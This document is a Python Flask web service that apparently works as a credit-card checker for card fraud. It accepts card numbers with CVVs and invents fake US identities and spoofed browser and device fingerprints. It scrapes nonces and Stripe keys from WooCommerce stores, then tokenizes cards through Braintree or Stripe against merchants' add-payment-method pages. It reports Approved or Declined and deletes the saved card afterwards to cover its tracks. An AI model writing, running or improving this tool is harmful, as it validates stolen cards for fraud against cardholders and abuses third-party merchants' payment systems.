import requests
import re
import json
import random
import logging
from flask import Flask, request, jsonify
import time
from lxml import html
import json
from urllib.parse import urlparse
from datetime import datetime, timedelta
from faker import Faker
from functools import wraps
import threading
import uuid

app = Flask(__name__)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

# Response messages
APPROVED = '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅'
DECLINED = '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
ERROR = '𝙀𝙍𝙍𝙊𝙍 ⚠️'
SUCCESS = '𝙎𝙐𝘾𝘾𝞢𝙎𝙎 ✅'
FAILED = '𝙁𝘼𝙄𝙇𝙀𝘿 ❌'

# Configuration
REQUEST_TIMEOUT = 30  # Reduced from 60 to optimize performance while maintaining reliability
CACHE_EXPIRY = timedelta(minutes=1)

fake = Faker("en_US")
DOMAINS = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]

# Cache for geographic data
geo_data_cache = {
    'data': None,
    'last_updated': None
}

def validate_input(func):
    """Decorator to validate input parameters"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            logger.error(f"Validation error in {func.__name__}: {str(e)}")
            return None
    return wrapper

def generate_fake_user_agent():
    """Generate a realistic random User-Agent"""
    versions = [
        "137.0.0.0", "138.0.0.0", "139.0.0.0", "140.0.0.0", 
        "141.0.0.0", "142.0.0.0", "143.0.0.0"
    ]
    android_versions = [10, 11, 12, 13, 14]
    devices = ["SM-G991B", "SM-G998B", "Pixel 6", "Pixel 7", "Mi 11"]
    
    return f"Mozilla/5.0 (Linux; Android {random.choice(android_versions)}; {random.choice(devices)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(versions)} Mobile Safari/537.36"

def fetch_city_zipcode_data():
    """Fetch US geographic data from GitHub repository with caching"""
    now = datetime.now()
    
    if (geo_data_cache['data'] is not None and 
        geo_data_cache['last_updated'] is not None and
        (now - geo_data_cache['last_updated']) < CACHE_EXPIRY):
        return geo_data_cache['data']
    
    url = "https://raw.githubusercontent.com/ANYA-LZ/country-map/refs/heads/main/US.json"
    try:
        response = requests.get(url, timeout=8)  # Further reduced timeout for geo data
        response.raise_for_status()
        geo_data = response.json()
        
        geo_data_cache['data'] = geo_data
        geo_data_cache['last_updated'] = now
        
        return geo_data
    except requests.RequestException as e:
        logger.error(f"Failed to fetch geographic data: {str(e)}")
        # Return a fallback dataset to avoid complete failure
        fallback_data = {
            "CA": {"Los Angeles": "90210", "San Francisco": "94102"},
            "NY": {"New York": "10001", "Albany": "12201"},
            "TX": {"Houston": "77001", "Dallas": "75201"},
            "FL": {"Miami": "33101", "Tampa": "33601"}
        }
        return fallback_data

@validate_input
def generate_random_person():
    """Generate realistic US resident profile"""
    geo_data = fetch_city_zipcode_data()
    if not geo_data:
        logger.error("No geographic data available")
        return None

    state = random.choice(list(geo_data.keys()))
    city = random.choice(list(geo_data[state].keys()))
    zipcode = geo_data[state][city]

    return {
        'first_name': fake.first_name(),
        'last_name': fake.last_name(),
        'email': f"{fake.user_name()[:10]}@{random.choice(DOMAINS)}".lower(),
        'phone': _format_phone_number(zipcode),
        'address': fake.street_address(),
        'city': city,
        'state': state,
        'zipcode': zipcode,
        'country': "United States",
        'user_agent': generate_fake_user_agent(),
    }

def _format_phone_number(zipcode):
    """Format phone number with area code matching zipcode"""
    base_num = fake.numerify("###-###-####")
    return f"({zipcode[:3]}) {base_num}"

def generate_cookies(gateway_config):
    cookies_list = gateway_config.get("cookies", [])
    cookies_dict = {}
    for cookie in cookies_list:
        if 'name' not in cookie or 'value' not in cookie:
            logger.error("Invalid cookie format")
            return ERROR, "Invalid cookie format"
        cookies_dict[cookie["name"]] = cookie["value"]

    return cookies_dict

def create_new_session(gateway_config, random_person):
    parsed_url = urlparse(gateway_config['url'])
    origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
    """Create a new session with random data"""
    session = requests.Session()

    headers = {
        'User-Agent': random_person['user_agent'],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        'Origin': origin,
        'Referer': gateway_config['url'],
    }
    
    # Update headers with random data
    session.headers.update(headers)

    response = session.get(
            url=origin,
            timeout=REQUEST_TIMEOUT
        )
    
    response.raise_for_status()
    
    if response.status_code != 200:
        logger.error(f"Failed to fetch initial page, status code: {response.status_code}")

    session.cookies.update(response.cookies)
    
    # Add random cookies to the session
    session.cookies.update(generate_cookies(gateway_config))

    return session

class SessionManager:
    """Manages separate sessions for each request to prevent mixing between requests"""
    
    def __init__(self):
        self.sessions = {}  # Dictionary to store request_id -> session mapping
        self.session_timestamps = {}  # Track session creation time for cleanup
        self.max_session_age = timedelta(minutes=0.5)  # Sessions expire after 0.5 minutes
        self.lock = threading.Lock()  # Thread lock for thread safety

    def create_request_id(self):
        """Create a unique request ID for each payment request"""
        return f"req_{uuid.uuid4().hex[:12]}_{int(time.time())}"
    
    def get_session(self, request_id, gateway_config, random_person):
        """Get or create a session for the specific request ID"""
        with self.lock:  # Ensure thread safety
            # Clean up old sessions first
            self._cleanup_old_sessions()
            
            # Always create a new session for each request to ensure complete isolation
            logger.info(f"Creating new session for request ID: {request_id}")
            session = create_new_session(gateway_config, random_person)
            self.sessions[request_id] = session
            self.session_timestamps[request_id] = datetime.now()
            
            return session
    
    def cleanup_session(self, request_id):
        """Remove a specific session from memory"""
        with self.lock:  # Ensure thread safety
            if request_id in self.sessions:
                logger.info(f"Cleaning up session for request ID: {request_id}")
                try:
                    self.sessions[request_id].close()  # Close the session properly
                except Exception as e:
                    logger.warning(f"Error closing session {request_id}: {str(e)}")
                
                del self.sessions[request_id]
                if request_id in self.session_timestamps:
                    del self.session_timestamps[request_id]
    
    def _cleanup_old_sessions(self):
        """Remove sessions that are older than max_session_age"""
        current_time = datetime.now()
        sessions_to_remove = []
        
        for request_id, timestamp in self.session_timestamps.items():
            if current_time - timestamp > self.max_session_age:
                sessions_to_remove.append(request_id)
        
        for request_id in sessions_to_remove:
            logger.info(f"Removing expired session: {request_id}")
            if request_id in self.sessions:
                try:
                    self.sessions[request_id].close()
                except Exception as e:
                    logger.warning(f"Error closing expired session {request_id}: {str(e)}")
                del self.sessions[request_id]
            if request_id in self.session_timestamps:
                del self.session_timestamps[request_id]
    
    def get_active_sessions_count(self):
        """Get the count of currently active sessions for monitoring"""
        with self.lock:
            return len(self.sessions)

# Global session manager instance
session_manager = SessionManager()

def get_session(request_id, gateway_config, random_person):
    """Get a session specific to the request ID to prevent mixing between requests"""
    return session_manager.get_session(request_id, gateway_config, random_person)

def extract_payment_config(request_id, card_number, random_person, gateway_config, session):
    result = {
        'nonce': None,
        'pk_live': None,
        'accountId': None,
        'createSetupIntentNonce': None,
        'email': None  # Added email field
    }
    
    try:
        response = session.post(
            gateway_config['url'],
            data={'_wc_user_reg': 'true'},
            timeout=REQUEST_TIMEOUT
        )
        response.raise_for_status()
        session.cookies.update(response.cookies)

        # 1. Extract NONCE from HTML
        tree = html.fromstring(response.content)
        nonce = tree.xpath('//input[@id="woocommerce-add-payment-method-nonce"]/@value')
        result['nonce'] = nonce[0] if nonce else None

        # 2. Extract other data from JavaScript
        script_content = response.text
        
        # Regex for Stripe keys, nonces, and email
        pk_match = re.search(r'"publishableKey":"(pk_live_[^"]+)"', script_content)
        account_match = re.search(r'"accountId":"(acct_[^"]+)"', script_content)
        setup_intent_nonce_match = re.search(r'"createSetupIntentNonce":"([^"]+)"', script_content)
        email_match = re.search(r'"email":"([^"]+)"', script_content)
        
        result['pk_live'] = pk_match.group(1) if pk_match else None
        result['accountId'] = account_match.group(1) if account_match else None
        result['createSetupIntentNonce'] = setup_intent_nonce_match.group(1) if setup_intent_nonce_match else None
        result['email'] = email_match.group(1) if email_match else None

        return result

    except requests.RequestException as e:
        logging.error(f"Request failed: {str(e)}")
        return result
    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")
        return result
    
@validate_input
def get_stripe_auth_id(random_person, card_info, publishable_key, account_id, url):
    """Generate payment token through Braintree API"""
    parsed_url = urlparse(url)
    origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
    if not isinstance(random_person, dict) or 'zipcode' not in random_person:
        logger.error("Invalid random_person parameter")
        return None, None

    formatted_card_number = ' '.join([card_info['number'][i:i+4] for i in range(0, len(card_info['number']), 4)])
    year_short = str(card_info['year'])[-2:]

    time_on_page = str(random.randint(120000, 240000))

    headers = {
        'User-Agent': random_person['user_agent'],
        'Accept': "application/json",
        'sec-ch-ua-mobile': "?1",
        'origin': "https://js.stripe.com",
        'referer': "https://js.stripe.com/"
    }

    payload = {
        'type': "card",
        'billing_details[name]': f"{random_person['first_name']} {random_person['last_name']}",
        'card[number]': card_info['number'],
        'card[cvc]': card_info['cvv'],
        'card[exp_month]': card_info['month'],
        'card[exp_year]': year_short,
        'guid': str(fake.uuid4()),
        'muid': str(fake.uuid4()),
        'sid': str(fake.uuid4()),
        'payment_user_agent': f"stripe.js/{random.randint(280000000, 290000000)}; stripe-js-v3/{random.randint(280000000, 290000000)}; card-element",
        'referrer': "https://fuelgreatminds.com",
        'time_on_page': time_on_page,
        'client_attribution_metadata[client_session_id]': str(fake.uuid4()),
        'client_attribution_metadata[merchant_integration_source]': "elements",
        'client_attribution_metadata[merchant_integration_subtype]': "card-element",
        'client_attribution_metadata[merchant_integration_version]': "2017",
        'key': publishable_key,
        '_stripe_account': account_id
    }

    try:
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=payload,
            timeout=REQUEST_TIMEOUT
        )
        response.raise_for_status()
        response_data = response.json()
        
        payment_id = response_data.get('id')
        if not payment_id:
            return False
        return payment_id
        
    except requests.RequestException as e:
        logger.error(f"Request failed in get_token: {str(e)}")
        return False
    except (KeyError, ValueError) as e:
        logger.error(f"Invalid response data: {str(e)}")
        return False
    
@validate_input
def get_bar_auth_token(payload, card_info, random_person, access_token):
    """Generate payment token through Braintree API"""
    
    if not isinstance(random_person, dict) or 'zipcode' not in random_person:
        logger.error("Invalid random_person parameter")
        return None, None

    headers = {
        'Authorization': f'Bearer {access_token}',
        'braintree-version': '2018-05-10',
        'Content-Type': 'application/json',
    }

    try:
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers,
            json=payload,
            timeout=REQUEST_TIMEOUT
        )
        response.raise_for_status()
        response_data = response.json()
        
        # Validate response structure
        if not response_data.get('data', {}).get('tokenizeCreditCard'):
            logger.error("Unexpected response structure from Braintree API")
            return None, None
            
        token_data = response_data['data']['tokenizeCreditCard']
        brandCode = token_data['creditCard']['brandCode']
        token = token_data['token']
        return token, brandCode
        
    except requests.RequestException as e:
        logger.error(f"Request failed in get_token: {str(e)}")
        return None, None
    except (KeyError, ValueError) as e:
        logger.error(f"Invalid response data: {str(e)}")
        return None, None

def get_payload_bar_auth_info_v2(auth_token):

    url = "https://payments.braintree-api.com/graphql"
    
    # GraphQL query payload
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(fake.uuid4())
        },
        "query": "query ClientConfiguration { clientConfiguration { analyticsUrl environment merchantId assetsUrl clientApiUrl creditCard { supportedCardBrands challenges threeDSecureEnabled threeDSecure { cardinalAuthenticationJWT } } applePayWeb { countryCode currencyCode merchantIdentifier supportedCardBrands } paypal { displayName clientId assetsUrl environment environmentNoNetwork unvettedMerchant braintreeClientId billingAgreementsEnabled merchantAccountId currencyCode payeeEmail } supportedFeatures } }",
        "operationName": "ClientConfiguration"
    }

    headers = {
        "Authorization": f"Bearer {auth_token}",
        "braintree-version": "2018-05-10",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    try:
        response = requests.post(
            url,
            json=payload,
            headers=headers,
            timeout=15  # Increased from 10 to 15 seconds
        )

        # Check for HTTP errors
        response.raise_for_status()

        # Parse JSON response
        config_data = response.json()

        # Validate response structure
        if "data" not in config_data or "clientConfiguration" not in config_data["data"]:
            raise ValueError("Invalid response structure from Braintree API")

        return config_data["data"]["clientConfiguration"]

    except requests.exceptions.RequestException as e:
        print(f"Request failed: {str(e)}")
        return None
    except json.JSONDecodeError as e:
        print(f"Failed to parse JSON response: {str(e)}")
        return None
    except ValueError as e:
        print(f"Invalid response data: {str(e)}")
        return None

def generate_payload_payment(request_id, card_number, random_person, gateway_config, card_info, session):
    secrets = extract_payment_config(request_id, card_number, random_person, gateway_config, session=session)

    # Corrected the typo from 'gataway_type' to 'gateway_type'
    if "Braintree Auth" in gateway_config['gateway_type']:
        
        if "v1_with_cookies" in gateway_config['version']:
            required_gateway_fields = ['cookies', 'url', 'access_token', 'success_message', 'error_message', 'post_url']
            for field in required_gateway_fields:
                if field not in gateway_config:
                    logger.error(f"Missing required field in gateway config: {field}")
                    return False, f"{field} is missing in gateway config"
            if not (nonce := secrets.get('nonce')):
                logger.error("Failed to fetch nonce")
                return False, "Failed to fetch nonce"
            
            payload_auth = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": fake.uuid4()
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                "variables": {
                    "input": {
                    "creditCard": {
                        "number": card_info['number'],
                        "expirationMonth": card_info['month'],
                        "expirationYear": card_info['year'],
                        "cvv": card_info['cvv']
                    },
                    "options": {
                        "validate": False
                    }
                    }
                },
                "operationName": "TokenizeCreditCard"
            }
            
            token, brandCode = get_bar_auth_token(
                payload_auth,
                card_info,
                random_person,
                gateway_config["access_token"]
            )

            if not token or not brandCode:
                logger.error("Failed to get token or brand code")
                return False, "Failed to fetch token or brand code"
            
            payload = {
                'payment_method': "braintree_credit_card",
                'wc-braintree-credit-card-card-type': brandCode,
                'wc-braintree-credit-card-3d-secure-enabled': "",
                'wc-braintree-credit-card-3d-secure-verified': "",
                'wc-braintree-credit-card-3d-secure-order-total': "0.00",
                'wc_braintree_credit_card_payment_nonce': token,
                'wc_braintree_device_data': json.dumps({"correlation_id": str(fake.uuid4())}),
                'wc-braintree-credit-card-tokenize-payment-method': "true",
                'woocommerce-add-payment-method-nonce': nonce,
                '_wp_http_referer': "/my-account/add-payment-method",
                'woocommerce_add_payment_method': "1"
            }
        
        elif "v3_with_cookies" in gateway_config['version']:
            required_gateway_fields = ['cookies', 'url', 'access_token', 'success_message', 'error_message']
            for field in required_gateway_fields:
                if field not in gateway_config:
                    logger.error(f"Missing required field in gateway config: {field}")
                    return False, f"{field} is missing in gateway config"
            payload_auth = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": fake.uuid4()
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                "variables": {
                    "input": {
                    "creditCard": {
                        "number": card_info['number'],
                        "expirationMonth": card_info['month'],
                        "expirationYear": card_info['year'],
                        "cvv": card_info['cvv'],
                        "billingAddress": {
                        "postalCode": random_person['zipcode'],
                        "streetAddress": ""
                        }
                    },
                    "options": {
                        "validate": False
                    }
                    }
                },
                "operationName": "TokenizeCreditCard"
            }
            
            token, brandCode = get_bar_auth_token(
                payload_auth,
                card_info,
                random_person,
                gateway_config["access_token"]
            )

            if not token or not brandCode:
                logger.error("Failed to get token or brand code")
                return False, "Failed to fetch token or brand code"
            
            payload_config = get_payload_bar_auth_info_v2(gateway_config["access_token"])
            if not payload_config:
                logger.error("Failed to get Braintree Auth payload info v2")
                return False, "Failed to get Braintree Auth payload info v2"
            
            if not (nonce := secrets.get('nonce')):
                logger.error("Failed to fetch nonce")
                return False, "Failed to fetch nonce"
            
            config_data = {
                "environment": payload_config["environment"],
                "clientApiUrl": payload_config["clientApiUrl"],
                "assetsUrl": payload_config["assetsUrl"],
                "merchantId": payload_config["merchantId"],
                "analytics": {"url": payload_config["analyticsUrl"]},
                "creditCards": {
                    "supportedCardTypes": payload_config["creditCard"]["supportedCardBrands"]
                },
                "challenges": payload_config["creditCard"]["challenges"],
                "threeDSecureEnabled": payload_config["creditCard"]["threeDSecureEnabled"],
                "paypal": payload_config["paypal"],
                "applePayWeb": payload_config["applePayWeb"]
            }
        
            payload = {
                "payment_method": "braintree_cc",
                "braintree_cc_nonce_key": token,
                "braintree_cc_device_data": json.dumps({
                    "device_session_id": str(fake.uuid4()),
                    "correlation_id": str(fake.uuid4())
                }),
                "braintree_cc_config_data": json.dumps(config_data),
                "woocommerce-add-payment-method-nonce": nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1"
            }

    elif "Stripe Auth" in gateway_config['gateway_type']:
        if "v1_with_cookies" in gateway_config['version']:
            required_gateway_fields = ['cookies', 'url', 'post_url']
            for field in required_gateway_fields:
                if field not in gateway_config:
                    logger.error(f"Missing required field in gateway config: {field}")
                    return False, f"{field} is missing in gateway config"

            if not (pk_live := secrets.get('pk_live')):
                logger.error("Failed to fetch pk live")
                return False, "Failed to fetch pk live"
            
            if not (accountId := secrets.get('accountId')):
                logger.error("Failed to fetch accountId")
                return False, "Failed to fetch accountId"
            
            if not (email := secrets.get('email')):
                logger.error("Failed to fetch email")
                return False, "Failed to fetch email"
            
            if not (payment_id := get_stripe_auth_id(random_person, card_info, pk_live, accountId, gateway_config['url'])):
                logger.error("Failed to fetch ID")
                return False, "Your card was rejected from the gateway"
            
            if not (ajax_nonce := secrets.get('createSetupIntentNonce')):
                logger.error("Failed to fetch ajax nonce")
                return False, "Failed to fetch ajax nonce"
            
            payload = {
                'action': 'create_setup_intent',
                'wcpay-payment-method': payment_id,
                '_ajax_nonce': ajax_nonce
            }
        
    else:
        logger.error(f"Unsupported gateway type: {gateway_config['gateway_type']}")
        return False, f"Unsupported gateway type: {gateway_config['gateway_type']}"

    return True, payload

def delete_payment_method(request_id, card_number, gateway_config, random_person, url, session):
    """Execute payment method deletion and return success status"""
    try:
        account_response = session.post(
            url=url,
            allow_redirects=True,
            timeout=15  # Shorter timeout for delete operations
        )
        account_response.raise_for_status()
        session.cookies.update(account_response.cookies)

        tree = html.fromstring(account_response.content)

        # Extract delete URL
        delete_links = tree.xpath('//a[contains(concat(" ", normalize-space(@class), " "), " delete ")]/@href')

        if not delete_links:
            logger.warning("No delete link found on account page")
            return False

        delete_url = delete_links[0]

        delete_response = session.post(
            url=delete_url,
            allow_redirects=True,
            timeout=15  # Shorter timeout for delete operations
        )
        delete_response.raise_for_status()
        session.cookies.update(account_response.cookies)
        
        return "Payment method deleted" in delete_response.text
            
    except requests.RequestException as e:
        logger.error(f"Request failed in delete_payment_method: {str(e)}")
        return False
    except Exception as e:
        logger.error(f"Unexpected error in delete_payment_method: {str(e)}")
        return False

def _parse_payment_response(request_id, card_number, content, random_person, gateway_config, session):
    """Parse and interpret payment gateway response (HTML or JSON)"""
    try:
        # First try to parse as JSON
        try:
            data = json.loads(content)
            
            # Check for success in JSON response
            if data.get('success') is True:
                message = 'Approved'
                return SUCCESS, message
            
            # Check for error in JSON response
            error_message = data.get('data', {}).get('error', {}).get('message', 'Unknown error').split('Error: ')[-1]
                
            return FAILED, error_message
            
        except json.JSONDecodeError:
            # If not JSON, parse as HTML
            tree = html.fromstring(content)
            extracted_message = "Unknown response"
            success_xpath = gateway_config['success_message']
            error_xpath = gateway_config['error_message']
            parsed_url = urlparse(gateway_config['url'])
            origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
            # Check for success in HTML
            success = tree.xpath(success_xpath)
            if success:
                message = 'Approved'
                if not delete_payment_method(request_id, card_number, gateway_config, random_person, f"{origin}/my-account/payment-methods/", session):
                    message = 'Approved (error delete)'
                return APPROVED, message

            # Check for errors in HTML
            error = tree.xpath(error_xpath)
            if error:
                error_message = error[0].strip()
                match = re.search(r":\s*(.*?)(?=\s*\(|$)", error_message)
                extracted_message = match.group(1) if match else error_message
                
                if "Duplicate card exists in the vault" in extracted_message:
                    extracted_message = 'Approved old try again'
                    if not delete_payment_method(request_id, card_number, gateway_config, random_person, f"{origin}/my-account/payment-methods/", session):
                        extracted_message = 'Approved old try again (error delete)'
                    return APPROVED, extracted_message

                return DECLINED, extracted_message
        
        # No success or error found in either format
        logger.warning("No success or error message found in response")
        return ERROR, "No success or error message found in response"
        
    except Exception as e:
        logger.error(f"Response parsing failed: {str(e)}")
        return ERROR, f"Parsing failed: {str(e)}"


def process_payment(request_id, gateway_config, card_info, random_person, session):
    start_time = time.time()
    card_number = card_info['number']
    
    # Log payload generation start
    logger.info(f"🔧 [REQUEST {request_id}] Generating payment payload...")
    status, result = generate_payload_payment(request_id, card_number, random_person, gateway_config, card_info, session)
    if not status:
        return ERROR, result
    
    payload = result
    payload_time = time.time() - start_time
    logger.info(f"⏱️ [REQUEST {request_id}] Payload generated in {payload_time:.2f}s")

    try:
        response = session.post(
            url=gateway_config["post_url"],
            data=payload,
            allow_redirects=True,
            timeout=REQUEST_TIMEOUT
        )
        session.cookies.update(response.cookies)
        
        # Parse response and clean up session after processing
        status, message = _parse_payment_response(request_id, card_number, response.content, random_person, gateway_config, session)
        
        # Clean up the session for this request to free memory
        session_manager.cleanup_session(request_id)
        
        return status, message
        
    except requests.RequestException as e:
        logger.error(f"Payment request failed for {request_id}: {str(e)}")
        # Clean up session on error as well
        session_manager.cleanup_session(request_id)
        return ERROR, f"Request failed: {str(e)}"

@app.route('/')
def index():
    return "Payment Gateway Service - Request Isolation Enabled"

@app.route('/status')
def system_status():
    """Get system status including active sessions count"""
    active_sessions = session_manager.get_active_sessions_count()
    return jsonify({
        "status": "running",
        "active_sessions": active_sessions,
        "isolation_mode": "request_based",
        "timestamp": datetime.now().isoformat()
    })

@app.route('/payment', methods=['POST'])
def handle_payment():
    # Generate unique request ID for complete isolation
    request_id = session_manager.create_request_id()
    start_time = time.time()
    
    logger.info(f"🔄 [REQUEST {request_id}] Started payment request processing")
    
    try:
        data = request.get_json()
        if not data:
            logger.error(f"❌ [REQUEST {request_id}] No data received in request")
            return jsonify({"status": ERROR, "result": "No data received"}), 400
        
        # Validate gateway configuration
        gateway_config = data.get('gateway_config')
        if not gateway_config:
            logger.error(f"❌ [REQUEST {request_id}] Missing gateway configuration")
            return jsonify({"status": ERROR, "result": "Gateway configuration is missing"}), 400
        
        # Validate card information
        card_info = data.get('card')
        if not card_info:
            logger.error(f"❌ [REQUEST {request_id}] No card information provided")
            return jsonify({"status": ERROR, "result": "Card information is missing"}), 400
        
        required_card_fields = ['number', 'month', 'year', 'cvv']
        for field in required_card_fields:
            if field not in card_info or not card_info[field]:
                logger.error(f"❌ [REQUEST {request_id}] Missing required card field: {field}")
                return jsonify({"status": ERROR, "result": f"{field} is missing in card info"}), 400
        
        # Log card identification for debugging (only last 4 digits)
        card_number = card_info['number']
        logger.info(f"💳 [REQUEST {request_id}] Processing payment for card ending in: {card_number[-4:]}")
        logger.info(f"📊 [REQUEST {request_id}] Active sessions count: {session_manager.get_active_sessions_count()}")
            
        # Generate random person profile
        random_person = generate_random_person()
        if not random_person:
            logger.error(f"❌ [REQUEST {request_id}] Failed to generate random person profile")
            return jsonify({"status": ERROR, "result": "Failed to generate random person"}), 400
        
        logger.info(f"👤 [REQUEST {request_id}] Generated profile for: {random_person['first_name']} {random_person['last_name']}")
        
        # Get isolated session for this specific request
        session = get_session(request_id, gateway_config, random_person)
        logger.info(f"🔗 [REQUEST {request_id}] Created isolated session")
            
        # Process payment with request-specific session
        status, result = process_payment(
            request_id,
            gateway_config,
            card_info,
            random_person,
            session=session
        )
        
        processing_time = time.time() - start_time
        logger.info(f"✅ [REQUEST {request_id}] Payment processed - Status: {status}, Result: {result}")
        logger.info(f"⏱️ [REQUEST {request_id}] Total processing time: {processing_time:.2f} seconds")
        logger.info(f"🧹 [REQUEST {request_id}] Session cleanup completed")

        if ERROR in status:
            return jsonify({
                "status": status,
                "result": result,
                "request_id": request_id,
                "processing_time": round(processing_time, 2)
            }), 400
        
        else:
            return jsonify({
                "status": status,
                "result": result,
                "request_id": request_id,
                "processing_time": round(processing_time, 2)
            }), 200
        
    except Exception as e:
        # Ensure session cleanup even on unexpected errors
        session_manager.cleanup_session(request_id)
        logger.error(f"💥 [REQUEST {request_id}] Unexpected error: {str(e)}", exc_info=True)
        return jsonify({
            "status": ERROR,
            "result": "Internal server error",
            "request_id": request_id
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
